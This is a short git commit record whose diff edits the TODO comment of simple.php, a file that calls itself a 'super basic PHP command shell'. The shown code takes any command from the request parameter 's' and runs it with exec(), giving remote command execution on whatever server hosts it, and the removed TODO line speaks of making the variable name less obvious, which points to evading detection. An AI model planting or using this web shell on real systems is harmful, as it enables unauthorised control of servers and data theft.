28dee5d85f4dfced2391dcc856e209e6468e6830
cheddar <jmg2967@rit.edu>
2014-01-29 15:14:59 -0500

    Updated TODO

--- simple.php
+++ simple.php
@@ -2,7 +2,6 @@
 /* Super basic PHP command shell.
        TODO
        - Base-64 decoding
-       - Change the "shell" variable to... something else... less obvious
 */
      $cmd = $_REQUEST["s"];
      exec($cmd, $out);
